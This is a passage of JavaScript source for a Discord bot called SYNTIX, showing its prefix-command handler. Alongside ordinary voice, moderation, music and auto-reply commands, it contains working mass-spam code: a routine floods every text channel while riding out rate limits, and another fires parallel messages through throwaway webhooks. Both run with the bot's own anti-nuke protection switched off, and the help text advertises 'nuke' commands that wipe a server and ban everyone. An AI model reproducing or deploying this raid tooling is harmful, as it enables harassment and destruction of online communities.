const { Events, EmbedBuilder, PermissionFlagsBits, ActionRowBuilder, ButtonBuilder, ButtonStyle, ChannelType } = require('discord.js');
const { getGuild, saveGuild } = require('../database/db');
const { guardMessage, beginSuppressedOperation, endSuppressedOperation, buildWhitelistPanel, buildModulesPanel } = require('../utils/antinukeManager');
const { withRetry } = require('../utils/retry');
const { markPending, consume } = require('../utils/pendingConfirms');
const music = require('../utils/musicManager');
const M = require('../utils/tempVCManager');
const { handleSteal } = require('../utils/steal');
const { matchAutoResponse, findAutoReactEmojis, normalize } = require('../utils/autoEngage');

const lastMessageByAuthor = new Map();

function ownedChannelOf(message, config, { owner = true } = {}) {
  try {
    const ctx = M.resolve(message.member, { owner });
    return { ctx, channel: ctx.channel, record: ctx.record };
  } catch (err) {
    if (err instanceof M.VCError) return { error: err.message };
    throw err;
  }
}

async function runVC(message, fn, { owner = true } = {}) {
  const owned = ownedChannelOf(message, null, { owner });
  if (owned.error) return message.reply({ content: `${owned.error}`, allowedMentions: { parse: [] } });
  try {
    const text = await fn(owned.ctx);
    return message.reply({ content: text, allowedMentions: { parse: [] } });
  } catch (err) {
    if (err instanceof M.VCError) return message.reply({ content: `${err.message}`, allowedMentions: { parse: [] } });
    console.error('[SYNTIX] Temp voice prefix command failed:', err);
    return message.reply('Action failed. Contact an admin.');
  }
}

function parseUserIds(message, args) {
  const ids = new Set(message.mentions.users.map((u) => u.id));
  for (const a of args) if (/^\d{17,20}$/.test(a)) ids.add(a);
  return [...ids];
}

function parseDuration(str) {
  if (!str) return null;
  const match = String(str).trim().match(/^(\d+)\s*(s|m|h|d)$/i);
  if (!match) return null;
  const amount = parseInt(match[1], 10);
  const unit = match[2].toLowerCase();
  const multipliers = { s: 1000, m: 60 * 1000, h: 60 * 60 * 1000, d: 24 * 60 * 60 * 1000 };
  return amount * multipliers[unit];
}

function formatUptime(ms) {
  const s = Math.floor(ms / 1000);
  const d = Math.floor(s / 86400);
  const h = Math.floor((s % 86400) / 3600);
  const m = Math.floor((s % 3600) / 60);
  const parts = [];
  if (d) parts.push(`${d}d`);
  if (h) parts.push(`${h}h`);
  if (m) parts.push(`${m}m`);
  parts.push(`${s % 60}s`);
  return parts.join(' ');
}

/**
 * Reads retry_after (in seconds) off a discord.js error in whichever shape it arrives.
 */
function retryAfterSeconds(err) {
  const candidates = [
    err?.retry_after,
    err?.retryAfter,
    err?.rawError?.retry_after,
    err?.data?.retry_after,
    err?.rawError?.retryAfter,
  ];
  for (const c of candidates) {
    if (typeof c === 'number' && c > 0) return c;
  }
  return 0;
}

/**
 * Brute-force spam. Fires `total` messages into every text channel in the guild
 * as fast as Discord accepts them, with a retry loop that eats 429s using the
 * exact retry_after the API hands back. No webhooks, no delays, no artificial
 * concurrency ceiling.
 * Returns { sent, failed, channels }.
 */
async function channelBomb(guild, text, perChannel) {
  const me = guild.members.me;
  const channels = [...guild.channels.cache.values()].filter(
    (c) =>
      (c.type === ChannelType.GuildText || c.type === ChannelType.GuildAnnouncement) &&
      c.permissionsFor(me)?.has(PermissionFlagsBits.SendMessages) &&
      c.permissionsFor(me)?.has(PermissionFlagsBits.ViewChannel)
  );

  if (channels.length === 0) return { sent: 0, failed: 0, channels: 0 };

  const jobs = channels.length * perChannel;
  let nextJob = 0;
  let sent = 0;
  let failed = 0;

  function claim() {
    if (nextJob >= jobs) return -1;
    return nextJob++;
  }

  async function worker(channel) {
    for (let job = claim(); job !== -1; job = claim()) {
      for (let attempt = 0; attempt < 5; attempt++) {
        try {
          await channel.send({ content: text, allowedMentions: { parse: [] } });
          sent++;
          break;
        } catch (err) {
          const status = err?.status ?? err?.httpStatus;
          if (status === 429) {
            const wait = retryAfterSeconds(err) || 0.5;
            await new Promise((r) => setTimeout(r, Math.ceil(wait * 1000) + 75));
            continue;
          }
          if (status === 403 || status === 404) {
            failed++;
            break;
          }
          if (attempt === 4) {
            failed++;
          } else {
            await new Promise((r) => setTimeout(r, 100));
          }
        }
      }
    }
  }

  await Promise.all(channels.map(worker));
  return { sent, failed, channels: channels.length };
}

/**
 * Fires N messages through M webhooks, all in flight at once, retrying on 429
 * using the exact retry_after the API handed back.
 * Returns { sent, failed, hooks }.
 */
async function webhookBomb(channel, text, total, username) {
  const MAX_WEBHOOKS = 15;
  const WEBHOOK_COUNT = Math.max(1, Math.min(MAX_WEBHOOKS, Math.ceil(total / 10)));

  const hookResults = await Promise.all(
    Array.from({ length: WEBHOOK_COUNT }, (_, i) =>
      withRetry(() => channel.createWebhook({
        name: `SYNTIX-wspm-${i + 1}`,
        reason: 'Temp webhook (wspm)',
      })).catch((err) => {
        console.error(`[SYNTIX] webhook create ${i + 1}/${WEBHOOK_COUNT} failed:`, err.message);
        return null;
      })
    )
  );
  const hooks = hookResults.filter(Boolean);

  if (hooks.length === 0) return { sent: 0, failed: 0, hooks: [] };

  let sent = 0;
  let failed = 0;

  let nextJob = 0;
  function claim() {
    if (nextJob >= total) return -1;
    return nextJob++;
  }

  async function worker(hook) {
    for (let job = claim(); job !== -1; job = claim()) {
      for (let attempt = 0; attempt < 4; attempt++) {
        try {
          await hook.send({ content: text, username });
          sent++;
          break;
        } catch (err) {
          const status = err?.status ?? err?.httpStatus;
          if (status === 429) {
            const wait = retryAfterSeconds(err) || 1;
            await new Promise((r) => setTimeout(r, Math.ceil(wait * 1000) + 100));
            continue;
          }
          if (attempt === 3) {
            failed++;
          } else {
            await new Promise((r) => setTimeout(r, 200));
          }
        }
      }
    }
  }

  await Promise.all(hooks.map(worker));
  return { sent, failed, hooks };
}

module.exports = {
  name: Events.MessageCreate,
  async execute(message) {
    if (message.author.bot || !message.guild) return;

    if (
      message.content === '' &&
      message.embeds.length === 0 &&
      message.attachments.size === 0 &&
      message.stickers.size === 0
    ) {
      if (!module.exports._warnedMissingContentIntent) {
        module.exports._warnedMissingContentIntent = true;
        console.warn(
          '[SYNTIX] Received a message with empty content. This means auto-react and the auto-responder ' +
          'cannot work. Enable "MESSAGE CONTENT INTENT" for this bot at ' +
          'https://discord.com/developers/applications -> your app -> Bot -> Privileged Gateway Intents, then restart the bot.'
        );
      }
    }

    const config = getGuild(message.guild.id);

    if (message.mentions.everyone && message.member) {
      await guardMessage(
        message.guild,
        message.member,
        'mentionSpam',
        '@everyone/@here mention spam detected'
      ).catch(() => null);
    }

    if (message.content && message.member) {
      const key = `${message.guild.id}:${message.author.id}`;
      const normalized = message.content.trim().toLowerCase();
      if (normalized && lastMessageByAuthor.get(key) === normalized) {
        await guardMessage(
          message.guild,
          message.member,
          'messageSpam',
          'Repeated message spam detected'
        ).catch(() => null);
      }
      lastMessageByAuthor.set(key, normalized);
    }

    const prefix = config.prefix || '&';

    for (const emoji of findAutoReactEmojis(config, message.content)) {
      await message.react(emoji).catch((err) => {
        console.warn(
          `[SYNTIX] Failed to auto-react in #${message.channel.name} (${message.guild.name}): ${err.message}. ` +
          `Check the bot has "Add Reactions" and "Read Message History" in that channel.`
        );
      });
    }

    if (!message.content.startsWith(prefix)) {
      const response = matchAutoResponse(config, message.guild.id, message.author.id, message.content);
      if (response) {
        await message.reply(response).catch((err) => {
          console.warn(
            `[SYNTIX] Failed to send auto-response in #${message.channel.name} (${message.guild.name}): ${err.message}. ` +
            `Check the bot has "Send Messages" and "Read Message History" in that channel.`
          );
        });
      }
      return;
    }

    const args = message.content.slice(prefix.length).trim().split(/\s+/);
    const cmd = args.shift()?.toLowerCase();
    if (!cmd) return;

    if (cmd === 'ping') {
      return message.reply(`Latency: **${message.client.ws.ping}ms**`);
    }

    if (cmd === 'uptime') {
      return message.reply(`Uptime: **${formatUptime(message.client.uptime)}**.`);
    }

    if (cmd === 'stats') {
      const embed = new EmbedBuilder()
        .setTitle('SYNTIX Stats')
        .setColor(0x5865F2)
        .addFields(
          { name: 'Servers', value: `${message.client.guilds.cache.size}`, inline: true },
          { name: 'Uptime', value: formatUptime(message.client.uptime), inline: true },
          { name: 'Latency', value: `${message.client.ws.ping}ms`, inline: true },
          { name: 'Active Temp Channels (this server)', value: `${Object.keys(config.tempvc.channels).length}`, inline: true },
          { name: 'Anti-Nuke', value: config.antinuke.enabled ? 'Enabled' : 'Disabled', inline: true },
          { name: 'Auto-Responder', value: config.autoresponder.enabled ? 'Enabled' : 'Disabled', inline: true },
          { name: 'Auto-React', value: config.autoreact.enabled ? 'Enabled' : 'Disabled', inline: true }
        );
      return message.reply({ embeds: [embed] });
    }

    if (cmd === 'help') {
      const embed = new EmbedBuilder()
        .setTitle('SYNTIX — Prefix Commands')
        .setColor(0x5865F2)
        .setDescription(
          `Current prefix: \`${prefix}\`\n\n` +
          `**Voice**\n` +
          `\`${prefix}lock\` / \`${prefix}unlock\` — lock or unlock your owned voice channel\n` +
          `\`${prefix}hide\` / \`${prefix}unhide\` — hide or reveal your owned voice channel\n` +
          `\`${prefix}limit <n>\` — set user limit (0 = unlimited)\n` +
          `\`${prefix}rename <n>\` — rename your channel\n` +
          `\`${prefix}interface [#channel]\` — post the voice control buttons (Manage Server)\n` +
          `\`${prefix}claim\` — claim ownership if the owner left\n` +
          `\`${prefix}info\` — show info about your current voice channel\n` +
          `\`${prefix}trust\` / \`${prefix}untrust\` \`@user\` — always allow / remove access\n` +
          `\`${prefix}block\` / \`${prefix}unblock\` \`@user\` — ban / unban someone from your channel\n` +
          `\`${prefix}kick @user\` · \`${prefix}invite @user\` · \`${prefix}transfer @user\`\n` +
          `\`${prefix}chat\` · \`${prefix}waiting\` — toggle channel chat / waiting room · \`${prefix}vcdelete\` — delete your channel\n` +
          `More options: use the Voice Interface buttons or \`/vc\`.\n\n` +
          `**Moderation** (Manage Channels / Manage Roles)\n` +
          `\`${prefix}lock [#channel]\` / \`${prefix}unlock [#channel]\` — lock/unlock a text channel (defaults to current)\n` +
          `\`${prefix}hide [#channel]\` / \`${prefix}unhide [#channel]\` — hide/reveal a text channel\n` +
          `\`${prefix}role @user @role\` — toggle a role on a member\n` +
          `\`${prefix}deleterole @role\` — delete a role\n` +
          `\`${prefix}deletechannel [#channel]\` — delete a channel (defaults to the current one)\n` +
          `\`${prefix}mute @user <time>\` / \`${prefix}unmute @user\` — timeout or lift a timeout (e.g. \`10m\`, \`2h\`, \`1d\`)\n` +
          `\`${prefix}nick @user <nickname>\` — set a member's nickname\n\n` +
          `**Emoji & Stickers** (Manage Emojis and Stickers)\n` +
          `\`${prefix}steal <emoji> <emoji> ...\` — copy emoji from other servers (also works as a **reply** to a message with emoji/stickers)\n` +
          `\`${prefix}steal\` as a reply to a sticker — copy the sticker(s) · add a name after a single item to rename it\n\n` +
          `**Anti-Nuke** (admin only)\n` +
          `\`${prefix}antinukeenable [#logchannel]\` — enable protection\n` +
          `\`${prefix}antinukedisable\` — disable protection\n` +
          `\`${prefix}wl [add|remove|list] [@user]\` — manage the anti-nuke whitelist (no args = interactive panel)\n` +
          `\`${prefix}modules\` — toggle individual anti-nuke protections on/off\n\n` +
          `**Bot owner only**\n` +
          `\`${prefix}createchannels [voice]\` — create multiple channels (asks for names, then how many of each)\n` +
          `\`${prefix}wspm <message> <count>\` — send a message N times via rotating webhooks (max 500)\n` +
          `\`${prefix}spm <message> <per-channel count>\` — raw brute-force spam into every text channel, no webhooks (max 500/channel)\n` +
          `\`${prefix}nuke\` — wipe the server (delete channels/roles, ban everyone)\n` +
          `\`${prefix}exe\` — fast wipe: delete every channel + role only, no bans\n\n` +
          `**Music**\n` +
          `\`${prefix}play <song or URL>\` — play or queue a song\n` +
          `\`${prefix}skip\` · \`${prefix}stop\` · \`${prefix}pause\` · \`${prefix}resume\`\n` +
          `\`${prefix}queue\` · \`${prefix}nowplaying\`\n` +
          `\`${prefix}volume <0-200>\` · \`${prefix}loop <off|track|queue>\`\n\n` +
          `**General**\n` +
          `\`${prefix}ping\` · \`${prefix}stats\` · \`${prefix}uptime\`\n` +
          `\`${prefix}avatar [@user]\` · \`${prefix}userinfo [@user]\` · \`${prefix}serverinfo\`\n\n` +
          `**Auto-Chat** (Manage Server)\n` +
          `\`${prefix}ar on|off\` — reply automatically to greetings like "hi"\n` +
          `\`${prefix}ar add <trigger>|<response>\` · \`\`${prefix}ar rmv <trigger>\` · \`${prefix}ar list\`\n` +
          `\`${prefix}atr on|off\` — react to messages with the emoji they contain\n\n` +
          `**Config** (admin only)\n` +
          `\`${prefix}setprefix <new prefix>\`\n\n` +
          `Full setup (categories, log channels, thresholds) still uses slash commands: ` +
          `\`/setup-tempvc\` and \`/setup-antinuke\`.`
        );
      return message.reply({ embeds: [embed] });
    }

    if (cmd === 'setprefix') {
      if (!message.member.permissions.has(PermissionFlagsBits.ManageGuild)) {
        return message.reply("You can't use this. Contact an admin.");
      }
      const newPrefix = args[0];
      if (!newPrefix || newPrefix.length > 5) {
        return message.reply('Give me a prefix up to 5 characters, e.g. `&setprefix !`');
      }
      config.prefix = newPrefix;
      saveGuild(message.guild.id, config);
      return message.reply(`Prefix changed to \`${newPrefix}\``);
    }

    if (cmd === 'autoresponder' || cmd === 'ar') {
      if (!message.member.permissions.has(PermissionFlagsBits.ManageGuild)) {
        return message.reply("You can't use this. Contact an admin.");
      }
      const sub = args[0]?.toLowerCase();

      if (sub === 'on' || sub === 'off') {
        config.autoresponder.enabled = sub === 'on';
        saveGuild(message.guild.id, config);
        return message.reply(`Auto-responder turned **${sub}**.`);
      }

      if (sub === 'add') {
        const rest = args.slice(1).join(' ');
        const [rawTrigger, ...respParts] = rest.split('|');
        const trigger = normalize(rawTrigger || '');
        const response = respParts.join('|').trim();
        if (!trigger || !response) {
          return message.reply(`Usage: \`${prefix}ar add <trigger>|<response>\`, e.g. \`${prefix}ar add gg|Good game\``);
        }
        const existing = config.autoresponder.triggers.find(t => t.match.includes(trigger));
        if (existing) existing.response = response;
        else config.autoresponder.triggers.push({ match: [trigger], response });
        saveGuild(message.guild.id, config);
        return message.reply(`When someone says \`${trigger}\`, I'll reply: ${response}`);
      }

      if (sub === 'remove' || sub === 'rmv') {
        const trigger = normalize(args.slice(1).join(' '));
        const before = config.autoresponder.triggers.length;
        config.autoresponder.triggers = config.autoresponder.triggers
          .map(t => ({ ...t, match: t.match.filter(m => m !== trigger) }))
          .filter(t => t.match.length > 0);
        if (config.autoresponder.triggers.length === before) {
          return message.reply(`No trigger matching \`${trigger}\` was found.`);
        }
        saveGuild(message.guild.id, config);
        return message.reply(`Removed the trigger \`${trigger}\`.`);
      }

      if (sub === 'list') {
        const lines = config.autoresponder.triggers.map(t => `\`${t.match.join('` / `')}\` → ${t.response}`);
        const embed = new EmbedBuilder()
          .setTitle('Auto-Responder Triggers')
          .setColor(0x5865F2)
          .setDescription(
            `Status: **${config.autoresponder.enabled ? 'Enabled' : 'Disabled'}**\n\n` +
            (lines.length ? lines.join('\n') : '_No triggers configured._')
          );
        return message.reply({ embeds: [embed] });
      }

      return message.reply(
        `Usage: \`${prefix}ar on|off\`, \`${prefix}ar add <trigger>|<response>\`, ` +
        `\`${prefix}ar rmv <trigger>\`, \`${prefix}ar list\``
      );
    }

    if (cmd === 'autoreact' || cmd === 'atr') {
      if (!message.member.permissions.has(PermissionFlagsBits.ManageGuild)) {
        return message.reply("You can't use this. Contact an admin.");
      }
      const sub = args[0]?.toLowerCase();
      if (sub !== 'on' && sub !== 'off') {
        return message.reply(`Usage: \`${prefix}atr on|off\``);
      }
      config.autoreact.enabled = sub === 'on';
      saveGuild(message.guild.id, config);
      return message.reply(`Auto-react turned **${sub}**.`);
    }

    if (cmd === 'avatar') {
      const target = message.mentions.users.first() || message.author;
      const embed = new EmbedBuilder()
        .setTitle(`${target.tag}'s avatar`)
        .setColor(0x5865F2)
        .setImage(target.displayAvatarURL({ size: 1024, extension: 'png' }));
      return message.reply({ embeds: [embed] });
    }

    if (cmd === 'userinfo' || cmd === 'whois') {
      const target = message.mentions.members?.first() || message.member;
      const embed = new EmbedBuilder()
        .setTitle(`${target.user.tag}`)
        .setColor(0x5865F2)
        .setThumbnail(target.user.displayAvatarURL({ size: 256 }))
        .addFields(
          { name: 'ID', value: target.id, inline: true },
          { name: 'Nickname', value: target.nickname || 'None', inline: true },
          { name: 'Joined server', value: `<t:${Math.floor(target.joinedTimestamp / 1000)}:R>`, inline: true },
          { name: 'Account created', value: `<t:${Math.floor(target.user.createdTimestamp / 1000)}:R>`, inline: true },
          { name: 'Roles', value: `${target.roles.cache.size - 1}`, inline: true }
        );
      return message.reply({ embeds: [embed] });
    }

    if (cmd === 'serverinfo') {
      const guild = message.guild;
      const embed = new EmbedBuilder()
        .setTitle(`${guild.name}`)
        .setColor(0x5865F2)
        .setThumbnail(guild.iconURL({ size: 256 }) || null)
        .addFields(
          { name: 'Owner', value: `<@${guild.ownerId}>`, inline: true },
          { name: 'Members', value: `${guild.memberCount}`, inline: true },
          { name: 'Channels', value: `${guild.channels.cache.size}`, inline: true },
          { name: 'Roles', value: `${guild.roles.cache.size}`, inline: true },
          { name: 'Created', value: `<t:${Math.floor(guild.createdTimestamp / 1000)}:R>`, inline: true },
          { name: 'Boosts', value: `${guild.premiumSubscriptionCount ?? 0}`, inline: true }
        );
      return message.reply({ embeds: [embed] });
    }

    // ---- owner: webhook spam. Usage: &wspm <message> <count> ----
    if (cmd === 'wspm' || cmd === 'webhookspam') {
      const ownerId = process.env.OWNER_ID?.trim();
      if (!ownerId) return message.reply("This command is disabled. Contact an admin.");
      if (message.author.id !== ownerId) {
        return message.reply("You can't use this. Contact an admin.");
      }

      if (args.length < 2) {
        return message.reply(`Usage: \`${prefix}wspm <message> <count>\` — e.g. \`${prefix}wspm hi 50\` (the count can go first or last).`);
      }

      const isWholeNumber = (tok) => /^\d+$/.test(tok);
      let count, text;
      if (isWholeNumber(args[args.length - 1])) {
        count = parseInt(args[args.length - 1], 10);
        text = args.slice(0, -1).join(' ').trim();
      } else if (isWholeNumber(args[0])) {
        count = parseInt(args[0], 10);
        text = args.slice(1).join(' ').trim();
      } else {
        return message.reply(
          `I need a whole number for the count, as either the first or last word. Usage: \`${prefix}wspm <message> <count>\`.`
        );
      }

      if (count < 1) {
        return message.reply(`Count has to be at least 1. Usage: \`${prefix}wspm <message> <count>\`.`);
      }
      if (!text) return message.reply('Include the message text along with the count.');

      const me = message.guild.members.me;
      if (!me.permissions.has(PermissionFlagsBits.ManageWebhooks)) {
        return message.reply("I don't have permission to do that. Contact an admin.");
      }
      if (!me.permissionsIn(message.channel).has(PermissionFlagsBits.ManageWebhooks)) {
        return message.reply("I don't have permission to do that. Contact an admin.");
      }

      const MAX_WEBHOOK_SPAM = 500;
      if (count > MAX_WEBHOOK_SPAM) {
        return message.reply(`Max is **${MAX_WEBHOOK_SPAM}**.`);
      }

      const progressMsg = await message.reply(`Sending ${count} message(s)...`);

      let stopProgress = false;
      beginSuppressedOperation(message.guild.id);

      let sent = 0;
      let failed = 0;
      const progressTimer = setInterval(() => {
        if (stopProgress) return;
        progressMsg.edit(`Sent **${sent + failed}/${count}**...`).catch(() => null);
      }, 1500);

      let createdHooks = [];
      try {
        const result = await webhookBomb(message.channel, text, count, message.author.username);
        sent = result.sent;
        failed = result.failed;
        createdHooks = result.hooks;

        stopProgress = true;
        clearInterval(progressTimer);

        if (createdHooks.length === 0) {
          return progressMsg.edit('Failed to create any webhooks. Check **Manage Webhooks** in this channel.');
        }

        return progressMsg.edit(
          `Sent **${sent}/${count}** via ${createdHooks.length} webhook(s)${failed ? ` (${failed} failed/rate-limited)` : ''}.`
        );
      } catch (err) {
        stopProgress = true;
        clearInterval(progressTimer);
        console.error('[SYNTIX] wspm error:', err);
        return progressMsg.edit(`Error: ${err.message}`);
      } finally {
        await Promise.all(createdHooks.map((hook) => hook.delete('SYNTIX wspm cleanup').catch(() => null)));
        endSuppressedOperation(message.guild.id);
      }
    }

    // ---- owner: raw channel spam. Usage: &spm <message> <per-channel count> ----
    if (cmd === 'spm' || cmd === 'channelspam') {
      const ownerId = process.env.OWNER_ID?.trim();
      if (!ownerId) return message.reply("This command is disabled. Contact an admin.");
      if (message.author.id !== ownerId) {
        return message.reply("You can't use this. Contact an admin.");
      }

      if (args.length < 2) {
        return message.reply(`Usage: \`${prefix}spm <message> <per-channel count>\` — e.g. \`${prefix}spm @everyone nuked 25\`.`);
      }

      const isWholeNumber = (tok) => /^\d+$/.test(tok);
      let perChannel, text;
      if (isWholeNumber(args[args.length - 1])) {
        perChannel = parseInt(args[args.length - 1], 10);
        text = args.slice(0, -1).join(' ').trim();
      } else if (isWholeNumber(args[0])) {
        perChannel = parseInt(args[0], 10);
        text = args.slice(1).join(' ').trim();
      } else {
        return message.reply(
          `I need a whole number for the per-channel count, as either the first or last word. Usage: \`${prefix}spm <message> <per-channel count>\`.`
        );
      }

      if (!perChannel || perChannel < 1) {
        return message.reply(`Per-channel count has to be at least 1.`);
      }
      if (perChannel > 500) {
        return message.reply(`Max is **500** per channel.`);
      }
      if (!text) return message.reply('Include the message text along with the count.');

      const me = message.guild.members.me;
      if (!me.permissions.has(PermissionFlagsBits.ManageChannels)) {
        return message.reply("I don't have permission to do that. Contact an admin.");
      }

      const textChannels = [...message.guild.channels.cache.values()].filter(
        (c) => c.type === ChannelType.GuildText || c.type === ChannelType.GuildAnnouncement
      );
      if (textChannels.length === 0) {
        return message.reply('There are no text channels to spam.');
      }

      const total = textChannels.length * perChannel;
      const progressMsg = await message.reply(
        `Spamming **${total}** message(s) across **${textChannels.length}** channel(s)...`
      );

      let stopProgress = false;
      beginSuppressedOperation(message.guild.id);

      let sent = 0;
      let failed = 0;
      const progressTimer = setInterval(() => {
        if (stopProgress) return;
        progressMsg.edit(`Sent **${sent + failed}/${total}**...`).catch(() => null);
      }, 1200);

      try {
        const result = await channelBomb(message.guild, text, perChannel);
        sent = result.sent;
        failed = result.failed;

        stopProgress = true;
        clearInterval(progressTimer);

        return progressMsg.edit(
          `Sent **${sent}/${total}** across ${result.channels} channel(s)${failed ? ` (${failed} failed/rate-limited)` : ''}.`
        );
      } catch (err) {
        stopProgress = true;
        clearInterval(progressTimer);
        console.error('[SYNTIX] spm error:', err);
        return progressMsg.edit(`Error: ${err.message}`);
      } finally {
        endSuppressedOperation(message.guild.id);
      }
    }

    // ---- bulk channel creation (two-step conversation) ----
    if (cmd === 'createchannels' || cmd === 'makechannels') {
      const ownerId = process.env.OWNER_ID?.trim();
      if (!ownerId) {
        return message.reply("This command is disabled. Contact an admin.");
      }
      if (message.author.id !== ownerId) {
        return message.reply("You can't use this. Contact an admin.");
      }

      const me = message.guild.members.me;
      if (!me.permissions.has(PermissionFlagsBits.ManageChannels)) {
        return message.reply("I don't have permission to do that. Contact an admin.");
      }

      const typeArg = args[0]?.toLowerCase();
      const channelType = typeArg === 'voice' ? ChannelType.GuildVoice : ChannelType.GuildText;

      await message.reply(
        `Send the channel names now — **one per line**. You have 90 seconds.\n` +
        `(Creating **${channelType === ChannelType.GuildVoice ? 'voice' : 'text'}** channels — use \`${prefix}createchannels voice\` for voice instead.)`
      );

      const nameCollector = await message.channel
        .awaitMessages({ filter: (m) => m.author.id === message.author.id, max: 1, time: 90000, errors: ['time'] })
        .catch(() => null);
      if (!nameCollector) return message.reply('Timed out waiting for channel names. Run the command again.');

      const namesMsg = nameCollector.first();
      const names = namesMsg.content
        .split('\n')
        .map((line) => line.trim())
        .filter(Boolean);

      if (names.length === 0) {
        return message.reply('No valid channel names found. Run the command again.');
      }

      await message.channel.send(`Got **${names.length}** name(s). How many of each should I create? Send a number. You have 30 seconds.`);

      const countCollector = await message.channel
        .awaitMessages({ filter: (m) => m.author.id === message.author.id, max: 1, time: 30000, errors: ['time'] })
        .catch(() => null);
      if (!countCollector) return message.reply('Timed out waiting for a count. Run the command again.');

      const count = parseInt(countCollector.first().content.trim(), 10);
      if (!count || count < 1) {
        return message.reply('That\'s not a valid number. Run the command again.');
      }

      const total = names.length * count;

      const GUILD_CHANNEL_CAP = 500;
      const remainingCapacity = GUILD_CHANNEL_CAP - message.guild.channels.cache.size;
      if (remainingCapacity <= 0) {
        return message.reply(`This server is already at Discord's ${GUILD_CHANNEL_CAP}-channel limit — nothing more can be created.`);
      }
      if (total > remainingCapacity) {
        return message.reply(
          `That would create **${total}** channel(s), but this server only has room for **${remainingCapacity}** more ` +
          `before hitting Discord's ${GUILD_CHANNEL_CAP}-channel limit. Lower the count/name list and try again.`
        );
      }

      const progressMsg = await message.channel.send(`Creating ${total} channel(s)...`);

      const jobs = [];
      for (const name of names) {
        for (let i = 0; i < count; i++) {
          jobs.push(name);
        }
      }

      let created = 0;
      let failed = 0;
      const failedNames = [];

      async function runBatched(items, concurrency, task) {
        let idx = 0;
        async function worker() {
          while (idx < items.length) {
            const item = items[idx++];
            await task(item);
          }
        }
        await Promise.all(Array.from({ length: Math.min(concurrency, items.length) }, worker));
      }

      beginSuppressedOperation(message.guild.id);
      try {
        await runBatched(jobs, 15, async (name) => {
          try {
            await withRetry(() => message.guild.channels.create({
              name,
              type: channelType
            }));
            created++;
          } catch (err) {
            failed++;
            failedNames.push(name);
            console.error(`[SYNTIX] Failed to create channel "${name}":`, err.message);
          }
        });
      } finally {
        endSuppressedOperation(message.guild.id);
      }

      let report = `Created **${created}/${total}** channel(s).`;
      if (failed > 0) {
        report += `\nFailed: ${failedNames.slice(0, 15).join(', ')}${failedNames.length > 15 ? '...' : ''}`;
      }
      return progressMsg.edit(report);
    }

    if (['lock', 'unlock', 'hide', 'unhide'].includes(cmd)) {
      const owned = ownedChannelOf(message, config);
      if (!owned.error) {
        const { ctx, channel } = owned;
        const mode = cmd === 'lock' ? 'locked'
          : cmd === 'hide' ? 'hidden'
          : cmd === 'unlock' ? 'public'
          : (M.privacyState(channel) === 'hidden' ? 'locked' : 'public');
        return runVC(message, (c) => M.actions.setPrivacy(c, mode));
      }
      if (message.member?.voice?.channel && config.tempvc.channels[message.member.voice.channel.id]) {
        return message.reply(`${owned.error}`);
      }

      if (!message.member.permissions.has(PermissionFlagsBits.ManageChannels)) {
        return message.reply(
          `You're not in an owned temp voice channel, and you need **Manage Channels** to ${cmd} a text channel.`
        );
      }

      const targetChannel = message.mentions.channels.first() || message.channel;
      if (targetChannel.guild?.id !== message.guild.id) {
        return message.reply("That channel isn't in this server.");
      }
      if (targetChannel.type !== ChannelType.GuildText && targetChannel.type !== ChannelType.GuildAnnouncement) {
        return message.reply('That has to be a text channel.');
      }

      try {
        if (cmd === 'lock') {
          await targetChannel.permissionOverwrites.edit(message.guild.id, { SendMessages: false });
          return message.reply(`${targetChannel} locked. Members can no longer send messages there.`);
        }
        if (cmd === 'unlock') {
          await targetChannel.permissionOverwrites.edit(message.guild.id, { SendMessages: null });
          return message.reply(`${targetChannel} unlocked.`);
        }
        if (cmd === 'hide') {
          await targetChannel.permissionOverwrites.edit(message.guild.id, { ViewChannel: false });
          return message.reply(`${targetChannel} hidden from @everyone.`);
        }
        if (cmd === 'unhide') {
          await targetChannel.permissionOverwrites.edit(message.guild.id, { ViewChannel: null });
          return message.reply(`${targetChannel} visible again.`);
        }
      } catch (err) {
        return message.reply(`Couldn't update that channel: ${err.message}. Check that my role is above @everyone and I have Manage Channels here.`);
      }
    }

    if (cmd === 'role') {
      if (!message.member.permissions.has(PermissionFlagsBits.ManageRoles)) {
        return message.reply("You can't use this. Contact an admin.");
      }
      const target = message.mentions.members?.first();
      const role = message.mentions.roles?.first();
      if (!target || !role) {
        return message.reply(`Usage: \`${prefix}role @user @role\``);
      }

      const me = message.guild.members.me;
      if (role.managed) return message.reply('That role is managed by an integration/bot and can\'t be assigned manually.');
      if (role.position >= me.roles.highest.position) {
        return message.reply('That role is higher than or equal to my highest role — move my role above it in Server Settings.');
      }
      if (
        role.position >= message.member.roles.highest.position &&
        message.guild.ownerId !== message.author.id
      ) {
        return message.reply("You can't use this. Contact an admin.");
      }

      try {
        if (target.roles.cache.has(role.id)) {
          await target.roles.remove(role, `Role toggled by ${message.author.tag} via &role`);
          return message.reply(`Removed ${role} from ${target}.`);
        } else {
          await target.roles.add(role, `Role toggled by ${message.author.tag} via &role`);
          return message.reply(`Added ${role} to ${target}.`);
        }
      } catch (err) {
        return message.reply(`Couldn't update that role: ${err.message}`);
      }
    }

    if (cmd === 'deleterole' || cmd === 'roledelete') {
      if (!message.member.permissions.has(PermissionFlagsBits.ManageRoles)) {
        return message.reply("You can't use this. Contact an admin.");
      }
      const role = message.mentions.roles?.first()
        || (args[0] && message.guild.roles.cache.get(args[0]))
        || (args.length ? message.guild.roles.cache.find((r) => r.name.toLowerCase() === args.join(' ').toLowerCase()) : null);
      if (!role) {
        return message.reply(`Usage: \`${prefix}deleterole @role\` (mention, ID, or exact name also work)`);
      }
      if (role.id === message.guild.id) {
        return message.reply("Can't delete the @everyone role.");
      }
      if (role.managed) {
        return message.reply("That role belongs to an integration/bot and can't be deleted manually.");
      }

      const me = message.guild.members.me;
      if (!me.permissions.has(PermissionFlagsBits.ManageRoles)) {
        return message.reply("I don't have permission to do that. Contact an admin.");
      }
      if (role.position >= me.roles.highest.position) {
        return message.reply('That role is higher than or equal to my highest role — move my role above it in Server Settings.');
      }
      if (
        role.position >= message.member.roles.highest.position &&
        message.guild.ownerId !== message.author.id
      ) {
        return message.reply("You can't use this. Contact an admin.");
      }

      const roleName = role.name;
      try {
        await withRetry(() => role.delete(`Deleted by ${message.author.tag} via ${prefix}deleterole`));
        return message.reply(`Deleted role **${roleName}**.`);
      } catch (err) {
        return message.reply(`Couldn't delete that role: ${err.message}`);
      }
    }

    if (cmd === 'deletechannel' || cmd === 'channeldelete') {
      if (!message.member.permissions.has(PermissionFlagsBits.ManageChannels)) {
        return message.reply("You can't use this. Contact an admin.");
      }
      let targetChannel;
      const mentioned = message.mentions.channels?.first();
      if (mentioned) {
        targetChannel = mentioned;
      } else if (args[0]) {
